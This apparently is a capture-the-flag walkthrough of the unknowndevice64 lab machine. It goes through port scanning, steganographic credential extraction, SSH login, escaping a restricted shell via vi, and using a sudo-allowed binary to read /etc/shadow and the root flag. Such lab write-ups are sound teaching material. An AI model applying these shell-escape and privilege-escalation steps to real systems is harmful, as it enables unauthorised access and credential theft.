@@ -1,0 +1,143 @@
+$ sudo netdiscover -i wlp2s0
+192.168.1.10
+
+$ nmap -sV 192.168.1.10 -Pn -T5 -p-
+
+PORT      STATE SERVICE VERSION
+1337/tcp  open  ssh     OpenSSH 7.7 (protocol 2.0)
+31337/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
+
+
+$ nmap -A 192.168.1.10 -Pn -T5 -p-
+
+PORT      STATE SERVICE VERSION
+1337/tcp  open  ssh     OpenSSH 7.7 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 b9:af:04:6d:f1:8c:59:3a:d6:e1:96:b7:f7:fc:57:83 (RSA)
+|   256 12:68:4c:6b:96:1e:51:59:32:8a:3d:41:0d:55:6b:d2 (ECDSA)
+|_  256 da:3e:28:52:30:72:7a:dd:c3:fb:89:7e:54:f4:bb:fb (ED25519)
+31337/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
+|_http-title:    Website By Unknowndevice64   
+
+$ dirb http://192.168.1.10:31337
+
+---- Scanning URL: http://192.168.1.10:31337/ ----
++ http://192.168.1.10:31337/index.html (CODE:200|SIZE:7466)  
+
+lets go to the url
+
+
+"Not a visible enthusiasm but a h1dd3n one, an excitement burning with a cold flame."
+
+
+lets look at the source code
+
+
+<!-- key_is_h1dd3n.jpg -->
+
+there is this entry on the source code
+
+lets go to http://192.168.1.10:31337/key_is_h1dd3n.jpg
+
+yes there is a file
+
+
+downloaded it and started searching the file
+
+first used strings command and binwalk tool to see if it has anything
+but id did not 
+
+and then I decided to use "steghide" a tool to put and extract data from an image
+
+$ steghide --extract -sf key_id_h1dd3n.jpg
+
+and the password is "h1dd3n"
+
+wrote extracted data to "h1dd3n.txt".
+
+$cat h1dd3n.txt
+
+++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++++++++++++++.-----------------.
+<----------------.--.++++++.---------.>-----------------------.<<+++.++.>+++++.--.
+++++++++++++.>++++++++++++++++++++++++++++++++++++++++.-----------------.
+
+this is what was inside the  hidden image file
+
+It looks like the brainfuck language
+
+lets decode it online searching brainfuck decoder
+
+ud64:1M!#64@ud this is the decoded version
+
+I saw this ud64 in main file of the web page
+
+maybe ud64 is username and 1M!#64@ud is password for ssh service
+
+lets try it 
+
+$ ssh -l ud64 192.168.1.10 -p 1337
+
+yes we are in  
+
+$whoami
+u64
+
+when I tried to use cat command I saw that it was a restricted shell
+rbash
+
+first we need to escape the restricted shell
+
+first thing I do when I try to escape a restricted shell is I use vi or vim
+
+let try to open /etc/passwd file with vi
+
+$ vi /etc/passwd
+
+type :!/bin/bash
+
+now we escaped the restricted shell
+
+now try to list file 
+
+$ ls 
+command not found
+
+$ /usr/bin/ls
+
+Desktop  Documents  Downloads  Music  Pictures	Public	Videos	prog  web
+
+it worked now
+
+now lets try to escalate our privilege
+
+$ /usr/bin/sudo -l
+
+User ud64 may run the following commands on unknowndevice64_v1:
+    (ALL) NOPASSWD: /usr/bin/sysud64
+
+it seems that we can run sudo command with /usr/bin/sysud64
+
+let see what /usr/bin/sysud64 does
+
+
+$/usr/bin/sysud64
+
+/usr/bin/sysud64: must have PROG [ARGS] or -p PID
+Try '/usr/bin/sysud64 -h' for more information.
+
+
+
+it looks like we can use this command to execute other commands as root
+
+lets try to read /etc/shadow file
+
+$ /usr/bin/sudo /usr/bin/sysud64 /usr/bin/cat /etc/shadow
+
+yes it worked
+
+now we can read the flag file
+
+$ /usr/bin/sudo /usr/bin/sysud64 /usr/bin/cat /root/flag.txt
+
+A hacker does for love what other wouldnt do for money.
+
